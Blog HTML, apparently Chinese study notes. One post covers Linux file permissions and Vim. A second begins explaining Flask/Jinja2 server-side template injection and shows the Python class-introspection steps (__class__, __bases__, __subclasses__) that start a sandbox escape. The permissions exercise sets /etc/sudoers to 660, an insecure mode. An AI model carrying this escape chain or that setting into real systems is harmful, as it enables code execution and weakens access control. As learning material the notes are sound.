<tr>
<th>角色</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>u</td>
<td>user,表示该文件的所有者</td>
</tr>
<tr>
<td>g</td>
<td>group,表示用户组</td>
</tr>
<tr>
<td>o</td>
<td>other,表示其他用户</td>
</tr>
<tr>
<td>a</td>
<td>all,表示所有用户</td>
</tr>
</tbody></table>
<p>权限设置说明</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>增加权限</td>
</tr>
<tr>
<td>-</td>
<td>撤销权限</td>
</tr>
<tr>
<td>&#x3D;</td>
<td>设置权限</td>
</tr>
</tbody></table>
<p>权限说明</p>
<table>
<thead>
<tr>
<th>权限</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>可读</td>
</tr>
<tr>
<td>w</td>
<td>可写</td>
</tr>
<tr>
<td>x</td>
<td>可执行，假如是目录，表示可打开目录</td>
</tr>
<tr>
<td>-</td>
<td>无任何权限</td>
</tr>
</tbody></table>
<h4 id="数字化"><a href="#数字化" class="headerlink" title="数字化"></a>数字化</h4><p>就是rwx用数字代替</p>
<p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230322211901985.png" alt="image-20230322211901985"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用数字法对/etc/sudoers文件的属主用户设置读写权限，同组用户为读写权限，其他用户为无权限</span><br><span class="line">rw-rw----</span><br><span class="line">chmod <span class="number">660</span> /etc/sudoers</span><br></pre></td></tr></table></figure>

<h1 id="Vim编辑器"><a href="#Vim编辑器" class="headerlink" title="Vim编辑器"></a>Vim编辑器</h1><h4 id="认识Vim"><a href="#认识Vim" class="headerlink" title="认识Vim"></a>认识Vim</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VI是Unix家族中极为普遍的文本编辑器，Vim则是它的改进版本Vi IMproved的简称，它的最大特色就是使用命令进行编辑，且完全脱离了鼠标的操作</span><br></pre></td></tr></table></figure>

<h4 id="Vim的三种工作模式"><a href="#Vim的三种工作模式" class="headerlink" title="Vim的三种工作模式"></a>Vim的三种工作模式</h4><p>命令模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">启动Vim，默认进入命令模式。在该模式下，此时从键盘上输入的任何字符都被当做编辑命令来解释</span><br><span class="line">常用于对文档进行复制、粘贴、删除、移动光标等操作。</span><br></pre></td></tr></table></figure>



<p>编辑模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在命令模式下输入插入命令i、附加命令a、打开命令o都可以进入编辑模式，一次Insert键:插入字符、两次Insert键:替换字符(REPLACE)在该模式下，主要用于录入文本。</span><br><span class="line">按ESC键回退到命令模式</span><br></pre></td></tr></table></figure>

<p>末行模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在命令模式按shift+；即按:进入末行模式，多数文件管理命令(保存、退出、定位、查找、替换、设置行标等)都是在此模式下执行的</span><br><span class="line"></span><br><span class="line">回车执行完命令或按ESC键回退到命令模式</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230322212409215.png" alt="image-20230322212409215"></p>
<h4 id="使用Vim编辑文件，文档配置"><a href="#使用Vim编辑文件，文档配置" class="headerlink" title="使用Vim编辑文件，文档配置"></a>使用Vim编辑文件，文档配置</h4><p>示例:使用Vim修改主机名</p>
<p>主机名配置文件：&#x2F;etc&#x2F;hostname</p>
<p>切换到root账号:suroot</p>
<p>使用Vim打开配置文件：vim&#x2F;etc&#x2F;hostname</p>
<p>按i进入编辑模式</p>
<p>修改为新的主机名(不要输入中文)</p>
<p>按ESC键由编辑模式进入命令模式</p>
<p>按shift+;由命令模式进入末行模式</p>
<p>输入wq保存退出Vim</p>
<p>注销用户或者重启系统后查看效果</p>
<h4 id="Vim常用的命令"><a href="#Vim常用的命令" class="headerlink" title="Vim常用的命令"></a>Vim常用的命令</h4><h5 id="命令模式下的Vim操作"><a href="#命令模式下的Vim操作" class="headerlink" title="命令模式下的Vim操作"></a>命令模式下的Vim操作</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">准备操作素材vim temp.txt</span><br><span class="line">从命令模式按i或者a进入编辑模式</span><br><span class="line">录入如下图所示文本</span><br><span class="line">在编辑模式按esc回退到命令模式，再按shift+;进入末行模式</span><br><span class="line">在末行模式中输入wq保存退出</span><br><span class="line">素材准备完毕</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>移动光标操作</span><br><span class="line">方向箭头(上下左右)</span><br><span class="line">^移至行首,$移至行尾</span><br><span class="line">G和gg(G移到文档最后一行，gg移到文档首行)</span><br><span class="line"><span class="number">2.</span>删除命令操作</span><br><span class="line">x删除光标所在字符</span><br><span class="line">dd剪切删除光标所在的一行</span><br><span class="line"><span class="number">3.</span>复制与粘贴命令</span><br><span class="line">yy与nyy：yy复制当前光标所在行，n yy复制光标行及光标下n-<span class="number">1</span>行</span><br><span class="line">p与np：p粘贴一次,n p粘贴n次</span><br></pre></td></tr></table></figure>

<h5 id="末行模式下的vim操作"><a href="#末行模式下的vim操作" class="headerlink" title="末行模式下的vim操作"></a>末行模式下的vim操作</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>文件保存退出</span><br><span class="line">w保存文档</span><br><span class="line">q退出文档</span><br><span class="line">wq保存且退出文档</span><br><span class="line">q!不保存退出文档</span><br><span class="line"><span class="number">2.</span>显示或隐藏行号</span><br><span class="line">setnu显示行号</span><br><span class="line">setnonu隐藏行号</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-SSTI"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/16/SSTI/"
    >SSTI</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/16/SSTI/" class="article-date">
  <time datetime="2023-03-16T12:24:04.000Z" itemprop="datePublished">2023-03-16</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/SSTI/">SSTI</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="SSTI漏洞产生原因"><a href="#SSTI漏洞产生原因" class="headerlink" title="SSTI漏洞产生原因"></a>SSTI漏洞产生原因</h2><p>render_template函数自动渲染对应的内容，不会在执行渲染，但是你用render_template_string就可能出现再次渲染的问题</p>
<p>导致里面的x会当作代码执行</p>
<h2 id="python类基础"><a href="#python类基础" class="headerlink" title="python类基础"></a>python类基础</h2><h3 id="class"><a href="#class" class="headerlink" title="class"></a><strong>class</strong></h3><p>在python中object类是python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类，每个类都有魔术变量__class__,表示当前类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.__class__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">print</span>([].__class__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="bases"><a href="#bases" class="headerlink" title="bases"></a><strong>bases</strong></h3><p>每一个类都有一个__bases__属性，列出其基类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">变量.__class__.__bases__ <span class="comment">#列出所有的基类，返回的是元组类型</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line">变量.__class__.__bases__[<span class="number">0</span>]  <span class="comment">#可以使用数组方法返回第一个基类</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__     <span class="comment">#它会显示类和基类，这是它和__bases__的不同,同样也可以使用数组方法</span></span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>

<h3 id="subclasses"><a href="#subclasses" class="headerlink" title="subclasses()"></a><strong>subclasses</strong>()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__()查看当前类的子类，格式变量.__class__.__bases__[<span class="number">0</span>].__subclasses__()  <span class="comment">#返回的是列表类型</span></span><br><span class="line">这个类也可以加数组来查看指定的索引值，例如变量.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;callable_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_itemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_valueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;mappingproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reverseitemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversekeyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversevalueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_reverseiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;longrange_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;moduledef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;odict_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;pickle.PickleBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;symtable entry&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;stderrprinter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.GenericAlias&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;anext_awaitable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator_asend&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator_athrow&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator_wrapped_value&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;InterpreterID&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;managedbuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.SimpleNamespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.UnionType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;BaseException&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_array_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_bitmap_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_collision_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;items&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_contextvars.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_contextvars.ContextVar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_contextvars.Token&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Token.MISSING&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zip&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.FrozenImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ImportLockContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread.lock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread.RLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread._local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io._BytesIOBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;nt.ScandirIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;nt.DirEntry&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;PyHKEY&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._LoaderBasics&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.FileLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespacePath&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespaceLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.PathFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.FileFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.Codec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.StreamReaderWriter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.StreamRecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abc._abc_data&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;abc.ABC&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Hashable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Awaitable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.AsyncIterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Callable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;os._AddedDllDirectory&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Helper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteCodec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteIncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteIncrementalDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteStreamReader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteStreamWriter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.DynamicClassAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types._GeneratorWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib._abc.Loader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.accumulate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.filterfalse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.zip_longest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.pairwise&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._tee&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._tee_dataobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reprlib.Repr&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._deque_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._tuplegetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections._Link&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools._lru_cache_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.KeyWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools._lru_list_elem&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partialmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.singledispatchmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.ContextDecorator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.AsyncContextDecorator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._GeneratorContextManagerBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._BaseExitStack&#x27;</span>&gt;]</span><br></pre></td></tr></table></figure>

